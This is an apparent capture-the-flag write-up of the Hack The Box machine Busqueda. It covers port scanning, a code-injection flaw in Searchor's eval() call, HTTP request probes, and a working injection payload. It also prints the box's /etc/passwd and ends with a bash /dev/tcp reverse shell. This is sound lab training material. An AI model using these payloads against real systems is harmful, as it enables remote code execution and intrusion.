---
title: "Busqueda HTB"
date: 2023-04-09T20:16:09-07:00
draft: false
---

# Recon

~~~sh
sudo nmap -sU -sS -p- --min-rate=10000 -T5 -Pn 10.129.113.93

PORT   STATE SERVICE  
22/tcp open  ssh  
80/tcp open  http
~~~

~~~sh
gobuster dir -u "http://searcher.htb/" -w /usr/share/dirbuster/directory-list-lowercase-2.3-medium.txt -t 30

/search               (Status: 405) [Size: 153]  
/server-status        (Status: 403) [Size: 277]
~~~

# Fuzzing
Looking at the repo the box uses for the url and finding what vulnerabilities are in v 2.4.2

~~~python
@click.argument("query")

def search(engine, query, open, copy):

try:

url = eval(f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})")

click.echo(url)

searchor.history.update(engine, query, url)

if open:
~~~




POC
~~~r
POST /search HTTP/1.1
Host: searcher.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: http://searcher.htb
Connection: close
Referer: http://searcher.htb/
Upgrade-Insecure-Requests: 1

engine=Bing&query='dir()'
~~~

Response:
~~~r
HTTP/1.1 200 OK
Date: Sat, 08 Apr 2023 21:02:13 GMT
Server: Werkzeug/2.1.2 Python/3.10.6
Content-Type: text/html; charset=utf-8
Content-Length: 0
Connection: close


~~~
The response being empty means some kind of exception occurred from the code in the repo

~~~r
POST /search HTTP/1.1
Host: searcher.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Origin: http://searcher.htb
Connection: close
Referer: http://searcher.htb/
Upgrade-Insecure-Requests: 1

engine=Bing&query='"""os.system("ls")"""'
~~~
response:
~~~r
HTTP/1.1 200 OK
Date: Sat, 08 Apr 2023 21:25:25 GMT
Server: Werkzeug/2.1.2 Python/3.10.6
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding
Connection: close
Content-Length: 53

https://www.bing.com/search?q=os.system%28%22ls%22%29
~~~

# Exploitation

using the payload: `a',__import__('os').system('ls')) #` will give successful injection!

the passwd file:
~~~sh
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:104::/nonexistent:/usr/sbin/nologin systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin pollinate:x:105:1::/var/cache/pollinate:/bin/false sshd:x:106:65534::/run/sshd:/usr/sbin/nologin syslog:x:107:113::/home/syslog:/usr/sbin/nologin uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin svc:x:1000:1000:svc:/home/svc:/bin/bash lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin _laurel:x:998:998::/var/log/laurel:/bin/false
~~~

for reverse shell:
~~~sh
bash -i >& /dev/tcp/10.10.14.XXX/1234 0>&1
~~~
encode that into base 64 then tell the server to decode it then run it with bash. To get a shell and then get a proper shell by exporting xterm!
